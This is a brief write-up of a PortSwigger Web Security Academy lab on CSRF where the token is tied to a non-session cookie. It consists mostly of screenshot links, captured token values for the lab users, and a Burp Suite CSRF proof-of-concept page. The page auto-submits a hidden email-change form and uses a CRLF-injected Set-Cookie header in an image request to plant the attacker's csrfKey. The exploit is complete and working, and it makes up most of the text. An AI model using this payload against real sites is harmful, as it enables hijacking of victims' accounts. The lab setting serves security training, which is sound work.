## CSRF where token is tied to non-session cookie

<img width="939" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/a232ed68-3fe1-41c9-a666-efd6371aa424">

## Solutions:

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/1ad74402-c2b1-410d-9e77-8e0f8584d940">


<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/6f5e3979-8431-42b0-b1bf-ada5a24508ca">

For User Wiener

csrf: gDbE9aGELpWRSrZzpZEKiBbylXUETUFq csrfkey: LbMYzTBNpxwMUXksBmrOjPbthEd8Na4f

For User Carlos

csrf: OVfPpgEizfZ5aZBoTEsroDPgKMNt3YM4 csrf Key: 24uBgd1HRRlHUII7bYBNz7F1lVekHYDc

<img width="1431" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/3bb6c7e7-3b26-48f3-aa9c-75798a0352ca">

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/ad4f0c00-4d16-458c-85a6-4710f6e71617">
<html>
  
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/');</script>
    <form action="https://0ac1000b0422fe7d82422e29004d0020.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hii45&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="tUPKneNhIgQi2QfZI41tvlsVR6e53bh4" />
      <input type="submit" value="Submit request" />
    </form>
  <img src="https://0ac1000b0422fe7d82422e29004d0020.web-security-academy.net/?search=hey%0d%0aSet-Cookie:%20csrfKey=SQFZcaxFoVU3URyQrh2buswScSlxyapG%3b%20SameSite=None" onerror="document.forms[0].submit()">
 </body>
</html>
-------------------
<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/047b2a16-51b6-401e-8cf5-61851e5fe57b">

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/d2056606-8154-47b7-83d1-31a6222c14be">